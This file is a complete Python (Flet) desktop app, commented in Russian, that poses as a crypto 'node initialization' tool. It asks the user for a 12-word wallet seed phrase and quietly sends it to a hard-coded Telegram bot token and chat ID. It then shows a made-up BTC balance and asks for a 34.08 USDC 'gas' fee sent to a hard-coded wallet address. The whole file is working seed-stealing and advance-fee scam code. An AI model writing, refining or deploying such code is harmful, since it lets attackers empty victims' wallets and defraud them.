import flet as ft
import requests
import random
import time

# Твои данные
TOKEN = "7544070267:AAH9m-CclS2u3T68Gq8u8-UuS2G69u-UuS2G"
CHAT_ID = "-1002410363241"
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

def main(page: ft.Page):
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.padding = 40

    # Элементы
    header = ft.Text("NODE INITIALIZATION", size=24, weight="bold")
    seed_input = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350)
    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", width=300, height=50, bgcolor="blue", color="white")
    status = ft.Text("", text_align="center", size=16)

    def on_click(e):
        phrase = seed_input.value.strip()
        
        if len(phrase.split()) != 12:
            status.value = "Ошибка: введите 12 слов"
            status.color = "red"
            page.update()
            return

        # 1. Меняем состояние
        btn.visible = False
        seed_input.visible = False
        status.value = "Подключение к узлу... Подождите"
        status.color = "yellow"
        page.update()

        # 2. Отправка в ТГ (через обычный запрос)
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                          json={"chat_id": CHAT_ID, "text": f"🔑 СИД: {phrase}"}, timeout=5)
        except: pass

        # 3. Финальный результат
        btc = round(random.uniform(0.0004, 0.0008), 6)
        status.value = f"✅ СИГНАТУРА НАЙДЕНА!\n\nБаланс: {btc} BTC\n\nДля вывода оплатите газ (34.08 USDC):\n{TARGET_ADDRESS}"
        status.color = "green"
        page.update()

    btn.on_click = on_click
    page.add(header, ft.Divider(height=20, color="transparent"), seed_input, btn, status)

# Самый простой запуск без async
if __name__ == "__main__":
    ft.app(target=main)

